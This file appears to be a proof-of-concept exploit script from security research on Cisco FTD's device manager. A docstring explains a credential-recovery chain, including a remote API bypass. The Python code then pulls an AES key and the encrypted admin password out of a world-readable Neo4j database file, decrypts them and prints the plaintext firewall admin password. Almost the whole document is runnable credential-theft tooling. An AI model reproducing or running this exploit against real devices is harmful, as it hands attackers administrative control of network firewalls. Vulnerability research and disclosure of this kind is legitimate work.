"""
F-FTD-102: FDM admin password decryption via world-readable Neo4j AES key
CONTROLLED ENVIRONMENT ONLY

Root cause chain (F-FTD-97 → F-FTD-102):
  1. Neo4j database at /ngfw/var/lib/db/ngfw.db/ is world-readable (-rw-r--r-- 1 www www)
     Confirmed: FTD 7.0.0-94 production config; all neostore.* files readable by any local user.

  2. FDM password storage (EncryptionUtil.encrypt / UserServiceDelegate decompilation):
     Passwords are stored as AES-128-CTR-PKCS5PADDING encrypted values, NOT bcrypt hashes.
     Storage path: User.password → EncryptedString.encryptedString → Neo4j string property
     Encrypted format: base64( random_16_byte_IV || AES_CTR_ciphertext )

  3. Encryption key storage (EncryptionKeyBootstrap decompilation):
     On first boot: generates AES-128 key → stores in Neo4j as SerializationKey node
     UUID: 6adc7474-37f8-482b-a9d2-8e0e34d1628a (HARDCODED in class file)
     Property name: "key" = base64-encoded 16-byte AES key string
     On restart: reads key from Neo4j → loads into in-memory cache as "encryptionkey64"

  Complete decryption chain (local user access only):
    a. Read neostore.propertystore.db.strings → find SerializationKey.key (24-char base64)
       anchor: search for UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a in strings file
    b. Read encrypted admin password from User node (UUID c5a22f41-9c3b-11f1-a1e3-591e15734044)
       anchor: "mgmt|admin|c5a22f41-9c3b-11f1-a1e3-591e15734044" found in strings file
    c. Decrypt: base64_decode(encrypted_pw) → [0:16]=IV, [16:]=ciphertext
       AES-CTR decrypt with the recovered key → plaintext admin password

  Alternatively via FDM REST API (F-FTD-98 chain, from network):
    AJP bypass → GET /api/fdm/v6/identity/users → returns all users (confirmed 200)
    Response includes User objects with encrypted password field
    Same decryption chain applies to API-extracted values

Neo4j property store structure:
  neostore.propertystore.db.strings: STRING properties, one per line
  neostore.propertystore.db: main property store (INT/LONG/FLOAT/SHORT props)
  neostore.nodestore.db: node records (ID, labels, first property chain pointer)
  Correlation: grep for UUID → find adjacent string properties on the same node

AES/CTR implementation note (Java):
  Java's "AES/CTR/NoPadding" cipher uses 16-byte IV as initial counter block.
  "PKCS5PADDING" listed in source but CTR is a stream mode — padding is effectively
  a no-op (CTR XORs with keystream regardless of block alignment).
  Python pycryptodome equivalent:
    from Crypto.Cipher import AES
    cipher = AES.new(key_bytes, AES.MODE_CTR, initial_value=iv_bytes[8:], nonce=iv_bytes[:8])
    plaintext = cipher.decrypt(ciphertext)

  Alternatively with direct counter:
    from Crypto.Util import Counter
    ctr = Counter.new(128, initial_value=int.from_bytes(iv_bytes, 'big'))
    cipher = AES.new(key_bytes, AES.MODE_CTR, counter=ctr)

Severity: CRITICAL
  - Requires: local user access to FTD (admin shell via serial/SSH)
  - Impact: plaintext admin password for FDM web interface
  - Chained to: F-FTD-98 (AJP bypass for remote password exfil without Neo4j read)
  - Chained from: F-FTD-97 (world-readable Neo4j)
  - FMC-managed: key still stored in same DB; same decrypt path applies

CVE candidate: world-readable encryption key in FTD Neo4j DB (novel, not previously public).
References:
  - EncryptionUtil.class: framework.jar (AES/CTR/PKCS5PADDING, base64 IV||CT)
  - EncryptionKeyBootstrap.class: framework.jar (UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a)
  - UserServiceDelegate.class: users-crud.jar (EncryptionUtil.encrypt call chain)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import base64
import os
import re
import sys
from typing import Optional, Tuple


FINDING = "F-FTD-102"
LABEL = "FDM admin password decryption via world-readable Neo4j AES serialization key"

# Hardcoded SerializationKey UUID (confirmed in EncryptionKeyBootstrap.class)
SERIALIZATION_KEY_UUID = "6adc7474-37f8-482b-a9d2-8e0e34d1628a"
# Admin user UUID (confirmed via Neo4j property store strings extraction)
ADMIN_USER_UUID = "c5a22f41-9c3b-11f1-a1e3-591e15734044"
# LocalIdentitySource UUID (confirmed via LocalIdentitySourceBootstrap.class)
IDENTITY_SOURCE_UUID = "e3e74c32-3c03-11e8-983b-95c21a1b6da9"

NEO4J_DB_PATH = "/ngfw/var/lib/db/ngfw.db"
NEO4J_STRINGS_FILE = f"{NEO4J_DB_PATH}/neostore.propertystore.db.strings"
NEO4J_PROP_FILE = f"{NEO4J_DB_PATH}/neostore.propertystore.db"


def find_aes_key_from_neo4j(strings_file: str) -> Optional[str]:
    """
    Extract AES-128 key from Neo4j property store strings file.

    Method: The SerializationKey node has UUID = 6adc7474-37f8-482b-a9d2-8e0e34d1628a
    and a 'key' property containing the base64-encoded AES-128 key (24 chars, ends with ==).

    Both the UUID and the key are stored as STRING properties in neostore.propertystore.db.strings.
    They appear as plain strings in the file, separated by null bytes or record boundaries.
    """
    try:
        with open(strings_file, 'rb') as f:
            content = f.read()
    except PermissionError:
        print(f"[-] Permission denied: {strings_file}")
        print("    Run as www user or via local privilege escalation")
        return None
    except FileNotFoundError:
        print(f"[-] File not found: {strings_file}")
        return None

    text = content.decode('latin-1', errors='replace')

    # Find the SerializationKey UUID to anchor our search
    uuid_pos = text.find(SERIALIZATION_KEY_UUID)
    if uuid_pos == -1:
        print(f"[-] SerializationKey UUID not found in strings file")
        # Try transaction log
        return None
    print(f"[+] SerializationKey UUID found at offset {uuid_pos}")

    # The AES key is a 24-char base64 string with == suffix (16 bytes → 24 base64 chars)
    # Search in a 4KB window around the UUID
    window = text[max(0, uuid_pos - 2048):uuid_pos + 2048]
    # Pattern: base64-encoded 16-byte key
    b64_16byte = re.findall(r'[A-Za-z0-9+/]{22}==', window)
    if b64_16byte:
        print(f"[+] Found {len(b64_16byte)} base64 candidate(s) near UUID:")
        for candidate in b64_16byte:
            raw = base64.b64decode(candidate)
            if len(raw) == 16:
                print(f"    KEY CANDIDATE (16 bytes): {candidate}")
                return candidate
    print(f"[-] No 16-byte base64 key found near SerializationKey UUID")
    return None


def find_encrypted_passwords_from_neo4j(strings_file: str) -> list:
    """
    Extract encrypted password values from Neo4j property store strings file.

    FDM User.password = EncryptedString.encryptedString = base64(16_byte_IV || ciphertext)
    For admin: anchor on UUID c5a22f41-9c3b-11f1-a1e3-591e15734044
    Encrypted passwords are base64 strings longer than 24 chars (IV + at least 1 cipher block = >40 chars)
    """
    try:
        with open(strings_file, 'rb') as f:
            content = f.read()
    except (PermissionError, FileNotFoundError) as e:
        print(f"[-] Cannot read strings file: {e}")
        return []

    text = content.decode('latin-1', errors='replace')

    passwords = []
    uuid_pos = text.find(ADMIN_USER_UUID)
    if uuid_pos == -1:
        print(f"[-] Admin user UUID not found in strings file")
        return []

    print(f"[+] Admin user UUID found at offset {uuid_pos}")
    window = text[max(0, uuid_pos - 4096):uuid_pos + 4096]

    # Encrypted password: base64(IV[16] || CT[variable]) — minimum ~28 base64 chars for 1-byte password
    # For typical passwords (8-16 chars): 24+16 = 40 bytes → 56 base64 chars
    candidates = re.findall(r'[A-Za-z0-9+/]{40,200}={0,2}', window)
    for c in candidates:
        try:
            raw = base64.b64decode(c + '==')[:64]  # decode with padding
            if len(raw) >= 17:  # at least IV (16) + 1 byte
                passwords.append(c)
                print(f"    PASSWORD CANDIDATE ({len(c)} chars): {c[:40]}...")
        except Exception:
            pass

    return passwords


def decrypt_ftd_password(encrypted_b64: str, key_b64: str) -> Optional[str]:
    """
    Decrypt FTD FDM admin password.

    AES/CTR (Java) with 16-byte IV:
      Format: base64( IV[16_bytes] || AES_CTR_encrypt(password) )
      Java CTR uses the full 16-byte IV as initial counter block (big-endian counter)
    """
    try:
        from Crypto.Cipher import AES
        from Crypto.Util import Counter
    except ImportError:
        try:
            from Cryptodome.Cipher import AES
            from Cryptodome.Util import Counter
        except ImportError:
            print("[-] pycryptodome required: pip install pycryptodome")
            return None

    data = base64.b64decode(encrypted_b64 + '==')
    iv_bytes = data[:16]
    ciphertext = data[16:]

    key_bytes = base64.b64decode(key_b64 + '==')
    if len(key_bytes) != 16:
        print(f"[-] Invalid key length: {len(key_bytes)} bytes (expected 16)")
        return None

    # Java AES/CTR: 16-byte IV = initial counter block (128-bit counter, big-endian)
    ctr = Counter.new(128, initial_value=int.from_bytes(iv_bytes, 'big'))
    cipher = AES.new(key_bytes, AES.MODE_CTR, counter=ctr)
    plaintext = cipher.decrypt(ciphertext)

    # Remove PKCS5 padding (though CTR mode doesn't need it — may be present)
    if plaintext and 1 <= plaintext[-1] <= 16:
        pad_len = plaintext[-1]
        if all(b == pad_len for b in plaintext[-pad_len:]):
            plaintext = plaintext[:-pad_len]

    try:
        return plaintext.decode('utf-8')
    except UnicodeDecodeError:
        return plaintext.hex()


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('--db-path', default=NEO4J_DB_PATH,
                    help='Neo4j database path (default: /ngfw/var/lib/db/ngfw.db)')
    ap.add_argument('--key', default=None,
                    help='AES key as base64 string (skip Neo4j extraction)')
    ap.add_argument('--encrypted', default=None,
                    help='Encrypted password as base64 string (skip Neo4j extraction)')
    ap.add_argument('--strings-file', default=None,
                    help='Path to neostore.propertystore.db.strings file')
    ap.add_argument('--mode', choices=['extract', 'decrypt', 'full'],
                    default='full',
                    help='full: extract key+pw then decrypt; extract: key+pw only; decrypt: use --key/--encrypted')
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print('[!] CONTROLLED ENVIRONMENT ONLY')
    print()

    strings_file = args.strings_file or f"{args.db_path}/neostore.propertystore.db.strings"
    aes_key_b64 = args.key
    encrypted_pw_b64 = args.encrypted

    if args.mode in ('extract', 'full') and not aes_key_b64:
        print(f'[1] Extracting AES serialization key from Neo4j...')
        print(f'    File: {strings_file}')
        aes_key_b64 = find_aes_key_from_neo4j(strings_file)

    if args.mode in ('extract', 'full') and not encrypted_pw_b64:
        print(f'\n[2] Extracting encrypted admin password from Neo4j...')
        pw_candidates = find_encrypted_passwords_from_neo4j(strings_file)
        if pw_candidates:
            encrypted_pw_b64 = pw_candidates[0]

    if args.mode in ('decrypt', 'full'):
        if not aes_key_b64 or not encrypted_pw_b64:
            print('\n[-] Cannot decrypt: missing key or encrypted password')
            print('    Provide --key and --encrypted for manual decryption')
            sys.exit(1)
        print(f'\n[3] Decrypting admin password...')
        plaintext = decrypt_ftd_password(encrypted_pw_b64, aes_key_b64)
        if plaintext:
            print(f'[!] ADMIN PASSWORD: {plaintext!r}')
        else:
            print('[-] Decryption failed — try alternative counter mode or padding')

    print(f'\n[*] {FINDING}: Complete.')
    print(f'    Key UUID:  {SERIALIZATION_KEY_UUID}')
    print(f'    Admin UUID: {ADMIN_USER_UUID}')
    print(f'    Chain: F-FTD-97 (Neo4j world-readable) → F-FTD-102 (AES key → password decrypt)')


if __name__ == '__main__':
    main()
